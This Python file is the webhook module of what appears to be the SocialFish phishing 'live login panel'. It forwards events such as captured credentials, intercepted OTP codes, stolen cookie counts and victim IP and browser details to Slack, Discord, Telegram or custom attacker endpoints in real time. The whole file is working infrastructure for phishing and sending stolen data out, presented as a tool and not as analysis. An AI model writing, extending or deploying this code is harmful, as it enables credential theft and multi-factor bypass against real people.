"""
Live Login Panel - Webhook Manager
Manages webhooks for Slack, Discord, Telegram, and custom HTTP endpoints
"""

import requests
import json
import logging
from threading import Thread
from queue import Queue
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class WebhookManager:
    """Manage webhooks for real-time notifications"""
    
    def __init__(self):
        self.webhooks = {}
        self.event_queue = Queue()
        self.webhook_id_counter = 0
        self.worker_thread = Thread(target=self._process_webhooks, daemon=True)
        self.worker_thread.start()
    
    def add_webhook(self, webhook_url, webhook_type='custom', events=None):
        """
        Add a new webhook
        
        Args:
            webhook_url: URL to send webhook to
            webhook_type: 'slack', 'discord', 'telegram', or 'custom'
            events: List of events to trigger on (default: all)
        
        Returns:
            dict with webhook_id and status
        """
        self.webhook_id_counter += 1
        webhook_id = self.webhook_id_counter
        
        # Validate webhook URL
        try:
            response = requests.head(webhook_url, timeout=5)
            if response.status_code >= 500:
                return {'status': 'error', 'message': 'Webhook URL not reachable'}
        except requests.exceptions.RequestException as e:
            return {'status': 'error', 'message': f'Invalid webhook URL: {e}'}
        
        self.webhooks[webhook_id] = {
            'id': webhook_id,
            'url': webhook_url,
            'type': webhook_type,
            'events': events or ['all'],
            'created_at': datetime.now().isoformat(),
            'status': 'active',
            'success_count': 0,
            'failure_count': 0
        }
        
        logger.info(f"[OK] Webhook added: {webhook_id} ({webhook_type})")
        return {'status': 'ok', 'webhook_id': webhook_id}
    
    def remove_webhook(self, webhook_id):
        """Remove a webhook"""
        if webhook_id in self.webhooks:
            del self.webhooks[webhook_id]
            logger.info(f"[OK] Webhook removed: {webhook_id}")
            return {'status': 'ok'}
        return {'status': 'error', 'message': 'Webhook not found'}
    
    def trigger_event(self, event_type, event_data):
        """
        Trigger webhooks for an event
        
        Args:
            event_type: Type of event (e.g., 'credentials_captured', 'otp_received')
            event_data: Data associated with the event
        """
        self.event_queue.put({
            'event_type': event_type,
            'event_data': event_data,
            'timestamp': datetime.now().isoformat()
        })
    
    def _process_webhooks(self):
        """Background worker to process webhook events"""
        while True:
            try:
                event = self.event_queue.get(timeout=1)
                self._send_event_to_webhooks(event)
            except Exception as e:
                logger.debug(f"[WEBHOOK] Queue timeout or error: {type(e).__name__}")
    
    def _send_event_to_webhooks(self, event):
        """Send event to all registered webhooks"""
        event_type = event['event_type']
        
        for webhook_id, webhook in self.webhooks.items():
            # Check if this webhook should trigger for this event
            if 'all' not in webhook['events'] and event_type not in webhook['events']:
                continue
            
            if webhook['status'] != 'active':
                continue
            
            # Build payload based on webhook type
            payload = self._build_payload(webhook['type'], event)
            
            # Send webhook
            try:
                if webhook['type'] == 'slack':
                    self._send_slack_webhook(webhook['url'], payload)
                elif webhook['type'] == 'discord':
                    self._send_discord_webhook(webhook['url'], payload)
                elif webhook['type'] == 'telegram':
                    self._send_telegram_webhook(webhook['url'], payload, event)
                else:  # custom
                    self._send_custom_webhook(webhook['url'], payload)
                
                webhook['success_count'] += 1
                logger.info(f"[OK] Webhook {webhook_id} sent successfully")
            except Exception as e:
                webhook['failure_count'] += 1
                logger.error(f"✗ Webhook {webhook_id} failed: {e}")
    
    def _build_payload(self, webhook_type, event):
        """Build webhook payload based on type"""
        event_type = event['event_type']
        event_data = event['event_data']
        timestamp = event['timestamp']
        
        if webhook_type == 'slack':
            return self._build_slack_message(event_type, event_data, timestamp)
        elif webhook_type == 'discord':
            return self._build_discord_message(event_type, event_data, timestamp)
        elif webhook_type == 'telegram':
            return self._build_telegram_message(event_type, event_data, timestamp)
        else:  # custom
            return {
                'event': event_type,
                'data': event_data,
                'timestamp': timestamp
            }
    
    def _build_slack_message(self, event_type, event_data, timestamp):
        """Build Slack message format"""
        
        # Color based on event type
        colors = {
            'credentials_captured': 'danger',  # red
            'otp_received': 'warning',  # orange
            'session_started': 'good',  # green
            'network_suspicious': 'danger',
            'mfa_detected': 'warning'
        }
        
        color = colors.get(event_type, '#36a64f')
        
        # Build the attachment
        attachment = {
            'fallback': f'SocialFish: {event_type}',
            'color': color,
            'title': f'🎯 SocialFish - {event_type.replace("_", " ").title()}',
            'text': self._event_description(event_type, event_data),
            'fields': self._event_fields(event_type, event_data),
            'ts': int(datetime.fromisoformat(timestamp).timestamp()),
            'footer': 'SocialFish Live Panel',
            'footer_icon': 'https://i.imgur.com/example.png'
        }
        
        return {
            'attachments': [attachment]
        }
    
    def _build_discord_message(self, event_type, event_data, timestamp):
        """Build Discord message format (embed)"""
        
        colors = {
            'credentials_captured': 0xFF0000,  # red
            'otp_received': 0xFFA500,  # orange
            'session_started': 0x00FF00,  # green
            'network_suspicious': 0xFF0000,
            'mfa_detected': 0xFFA500
        }
        
        color = colors.get(event_type, 0x36a64f)
        
        embed = {
            'title': f'🎯 SocialFish - {event_type.replace("_", " ").title()}',
            'description': self._event_description(event_type, event_data),
            'color': color,
            'fields': self._event_fields(event_type, event_data),
            'timestamp': timestamp,
            'footer': {
                'text': 'SocialFish Live Panel'
            }
        }
        
        return {
            'embeds': [embed]
        }
    
    def _event_description(self, event_type, event_data):
        """Get event description for webhook"""
        descriptions = {
            'credentials_captured': f"New credentials captured from victim",
            'otp_received': f"OTP code received: {event_data.get('otp_code', 'N/A')}",
            'session_started': f"New victim session from {event_data.get('victim_ip', 'unknown')}",
            'network_suspicious': f"Suspicious network activity detected",
            'mfa_detected': f"Multi-factor authentication flow detected",
            'cookies_captured': f"{len(event_data.get('cookies', []))} cookies captured"
        }
        
        return descriptions.get(event_type, 'Event triggered')
    
    def _event_fields(self, event_type, event_data):
        """Get event fields for webhook"""
        fields = []
        
        if event_type == 'credentials_captured':
            for key, value in event_data.items():
                if key != 'password':  # Don't leak passwords
                    fields.append({
                        'name': key.title(),
                        'value': f'`{str(value)[:50]}`',
                        'inline': True
                    })
        
        elif event_type == 'session_started':
            fields.extend([
                {
                    'name': 'Victim IP',
                    'value': f"`{event_data.get('victim_ip', 'unknown')}`",
                    'inline': True
                },
                {
                    'name': 'Browser',
                    'value': f"`{str(event_data.get('victim_ua', 'unknown'))[:40]}`",
                    'inline': True
                }
            ])
        
        elif event_type == 'cookies_captured':
            fields.append({
                'name': 'Cookie Count',
                'value': str(len(event_data.get('cookies', []))),
                'inline': True
            })
            
            # Add secure/httponly stats
            secure_count = sum(1 for c in event_data.get('cookies', []) if c.get('secure'))
            httponly_count = sum(1 for c in event_data.get('cookies', []) if c.get('httponly'))
            
            fields.extend([
                {
                    'name': 'Secure Flag',
                    'value': f'{secure_count} / {len(event_data.get("cookies", []))}',
                    'inline': True
                },
                {
                    'name': 'HttpOnly Flag',
                    'value': f'{httponly_count} / {len(event_data.get("cookies", []))}',
                    'inline': True
                }
            ])
        
        return fields
    
    def _send_slack_webhook(self, webhook_url, payload):
        """Send webhook to Slack"""
        response = requests.post(webhook_url, json=payload, timeout=10)
        response.raise_for_status()
    
    def _send_discord_webhook(self, webhook_url, payload):
        """Send webhook to Discord"""
        response = requests.post(webhook_url, json=payload, timeout=10)
        response.raise_for_status()
    
    def _send_telegram_webhook(self, webhook_url, payload, event):
        """Send webhook to Telegram Bot API"""
        # webhook_url format: "CHAT_ID:TOKEN" or full URL
        try:
            if ':' in webhook_url and not webhook_url.startswith('https'):
                # Format: CHAT_ID:TOKEN
                chat_id, token = webhook_url.rsplit(':', 1)
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                message = payload.get('text', '')
                telegram_payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }
            else:
                # Assume it's a full Telegram Bot API URL
                url = webhook_url
                message = payload.get('text', '')
                telegram_payload = {
                    'chat_id': payload.get('chat_id'),
                    'text': message,
                    'parse_mode': 'HTML'
                }
            
            response = requests.post(url, json=telegram_payload, timeout=10)
            response.raise_for_status()
        except Exception as e:
            logger.error(f"Telegram webhook failed: {e}")
            raise
    
    def _build_telegram_message(self, event_type, event_data, timestamp):
        """Build Telegram message format"""
        # Format message as HTML for Telegram
        title = f"🎯 <b>{event_type.replace('_', ' ').title()}</b>"
        description = self._event_description(event_type, event_data)
        
        message = f"{title}\n\n"
        message += f"<i>{description}</i>\n\n"
        
        # Add key details
        if event_type == 'credentials_captured':
            message += "<b>Captured Data:</b>\n"
            for key, value in event_data.items():
                if key != 'password' and value:
                    message += f"• <code>{key}</code>: {str(value)[:100]}\n"
        
        elif event_type == 'session_started':
            message += f"<b>Victim Info:</b>\n"
            message += f"• IP: <code>{event_data.get('victim_ip', 'unknown')}</code>\n"
            message += f"• Browser: {str(event_data.get('victim_ua', 'unknown'))[:80]}\n"
        
        elif event_type == 'cookies_captured':
            cookies = event_data.get('cookies', [])
            message += f"<b>Cookies Captured:</b> {len(cookies)}\n"
            message += f"• Secure: {sum(1 for c in cookies if c.get('secure'))}\n"
            message += f"• HttpOnly: {sum(1 for c in cookies if c.get('httponly'))}\n"
        
        message += f"\n<i>Time: {timestamp}</i>"
        
        return {
            'text': message,
            'chat_id': None  # Will be extracted from webhook_url
        }
    
    def _send_custom_webhook(self, webhook_url, payload):
        """Send webhook to custom HTTP endpoint"""
        response = requests.post(webhook_url, json=payload, timeout=10)
        response.raise_for_status()
    
    def get_webhook_list(self):
        """Get list of all webhooks"""
        return list(self.webhooks.values())
    
    def get_webhook_stats(self):
        """Get webhook statistics"""
        stats = {
            'total_webhooks': len(self.webhooks),
            'active_webhooks': len([w for w in self.webhooks.values() if w['status'] == 'active']),
            'total_events_sent': sum(w['success_count'] for w in self.webhooks.values()),
            'total_failures': sum(w['failure_count'] for w in self.webhooks.values())
        }
        return stats
